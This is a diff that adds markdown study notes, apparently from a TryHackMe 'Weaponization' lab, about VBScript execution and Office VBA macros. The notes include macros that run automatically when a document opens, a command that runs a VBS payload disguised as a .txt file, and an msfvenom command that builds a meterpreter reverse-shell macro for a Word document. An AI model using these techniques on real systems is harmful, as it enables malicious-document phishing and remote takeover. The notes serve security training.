@@ -1,0 +1,75 @@
+
+	## Info
+	- It is a Windows native engine, cscript.exe (for command-line scripts) and wscript.exe (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including vbs and vbe.
+
+	## How to exec
+	- Its is posible to use either od the follogin commands:
+		- wscript scipt.vbs
+		- cscript scrpt.vbs
+
+	## Codes ##
+
+		## Basic Hello World
+		```
+		Dim message 
+		message = "Welcome to THM"
+		MsgBox message
+		```
+
+		## Invoke executable
+		```
+		Set shell = WScript.CreateObject("Wscript.Shell")
+		shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
+		```
+
+	## Restriction Evasion
+
+		## Run VBS script inside a .txt file
+		- wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
+
+	## VBA (Visual Basic for Application)
+	- Macros are Microsoft Office applications that contain embedded code written in a programming language known as Visual Basic for Applications (VBA)
+	- Macro-Enabled format such as .doc and docm.
+	- Macro is enabled by going to File → save "Docuemtn name" and save as type → Word 97-2003 Document and finally, save.
+
+		## Macros Editor in Microsoft Word
+		- View > Macros Editor
+
+		## Basic Macro Mesasse Box
+		- In the Macros Editor it's necessary to specify the in the "Macros in" the name of the document. Them click on "Create"
+		- Macros Code:
+			```
+			Sub THM()
+				MsgBox ("Welcome to Weaponization Room!")
+			End Sub
+			```
+
+		## Execute Macro when document is open MessaseBox
+		```
+		Sub Document_Open()
+		  THM
+		End Sub
+
+		Sub AutoOpen()
+		  THM
+		End Sub
+
+		Sub THM()
+		   MsgBox ("Welcome to Weaponization Room!")
+		End Sub
+		```
+
+		## Execute .exec
+		```
+		Sub PoC()
+			Dim payload As String
+			payload = "calc.exe"
+			CreateObject("Wscript.Shell").Run payload,0
+		End Sub
+		```
+
+		## Macro with meterpreter
+		- Create Payload:
+			> msfvenom -p windows/meterpreter/reverse_tcp LHOST=[LocalIP] LPORT=[LocalPort] -f vba
+			> change the Workbook_Open() to Document_Open()
+
